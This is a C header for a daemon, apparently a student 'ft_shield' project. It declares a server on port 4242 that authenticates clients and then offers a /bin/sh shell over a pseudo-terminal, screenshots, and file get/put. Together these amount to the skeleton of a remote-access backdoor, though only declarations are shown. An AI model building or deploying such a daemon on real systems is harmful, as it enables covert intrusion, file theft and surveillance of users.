#ifndef DAEMON_SERVER_HPP
#define DAEMON_SERVER_HPP

#include <errno.h>
#include <netdb.h>
#include <poll.h>
#include <shield/commands.h>
#include <shield/string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <time.h>

#if MATT_MODE
#include "Tintin_reporter.hpp"
#define MLOG(x) that->logger.info(x) 
#define MERR(x) that->logger.error(x)
#else // !MATT_MODE
#define MLOG(x)
#define MERR(x)
#endif // !MATT_MODE

#define MATT_LOGFILE "matt_daemon"
#if SHIELD_DEBUG
#define MATT_LOGFILE_DIR "/tmp/matt_daemon"
#else // !SHIELD_DEBUG
#define MATT_LOGFILE_DIR "/var/log/matt_daemon"
#endif // !SHIELD_DEBUG

#define FT_SHIELD_MAX_CLIENTS 3
#define MAX_FD FT_SHIELD_MAX_CLIENTS*2+1

#ifndef FT_SHIELD_PORT
# define FT_SHIELD_PORT 4242
#endif // !FT_SHIELD_PORT
#ifndef FT_SHIELD_PORT_STRING
# define FT_SHIELD_PORT_STRING "4242"
#endif // !FT_SHIELD_PORT_STRING

#define FT_SHIELD_SHELL "/bin/sh" 
#define FT_SHIELD_TIMEOUT 60		// time in Seconds before a client gets dropped (from idling in auth) range before being dropped is [0..FT_SHIELD_TIMEOUT]
#define FT_SHIELD_MESSAGE_SIZE 4096

enum client_state
{
	CLIENT_UNUSED,			// client_t slot is unused
	CLIENT_CONNECTED,		// Initial state, awaiting authentication
	CLIENT_AUTHENTICATED,	// Authenticated, awaiting command
	CLIENT_DISCONNECTED,	// client_t has been set to be disconnected
};

enum fd_type
{
	FD_UNUSED,			// File descriptor is unused
	FD_SERVER,			// File descriptor is the server socket
	FD_CLIENT_SOCKET,	// File descriptor is a client's socket
	FD_CLIENT_PTY		// File descriptor is a pseudo-terminal
};

typedef struct
{
	enum fd_type fd_type;
	int client_index;
}	fd_metadata_t;

typedef struct client
{
	int index;
	struct pollfd* pollfd;
	fd_metadata_t* metadata;
	enum client_state state;
	time_t last_seen;
	kr_string_t in_buffer;
	kr_string_t out_buffer;

	int pty_fd;
}	client_t;

int client_write(client_t *client, kr_string_t *string);
int client_read(client_t *client, kr_string_t *string);

static const command_t commands[] =
{
	{"shell", "shell", "Closes the connection temporairly and launches a shell", shield_cmd_shell},
	{"help", "help [command]", "Provides help about the command list or a particular command", shield_cmd_help},
	{"screenshot", "screenshot", "If a graphical session is running, takes a screenshot", shield_cmd_screenshot},
	{"get", "get <path>", "Downloads a file from the server", shield_cmd_get},
	{"put", "put <path>", "Uploads a file to the server", shield_cmd_put},
	//TODO: stats command
	{NULL, NULL, NULL, NULL}
};

typedef struct DaemonServer
{
	struct pollfd	pollfd_array[MAX_FD];						// MAX_FD is twice the max number of clients + 1 slot for the server
	fd_metadata_t	poll_metadata[MAX_FD];
	client_t		client_list[FT_SHIELD_MAX_CLIENTS];
	bool			should_accept;								// bool indicating if server should accept clients 
	int				current_conn;								// number of currently connected clients
	bool			shell_next;
#if MATT_MODE
	Tintin_reporter	logger;
#endif
}	DaemonServer;

void	daemon_accept_new_client(DaemonServer *that);
void	daemon_clear_client(DaemonServer *that, client_t *client);				// will not do anything if client is NULL
void	daemon_disconnect_client(DaemonServer *that, size_t client_index);
bool	daemon_receive_message(DaemonServer *that, size_t client_index);
void	daemon_send_message(DaemonServer *that, size_t client_index);
void	daemon_check_activity(DaemonServer *that, size_t client_index);

void	daemon_receive_shell_data(DaemonServer *that, size_t client_index);
void	daemon_send_shell_data(DaemonServer *that, size_t client_index);

int		daemon_init(DaemonServer *that);
void	daemon_run(DaemonServer *that);
void	daemon_cleanup(DaemonServer *that);

#endif // DAEMON_SERVER_HPP
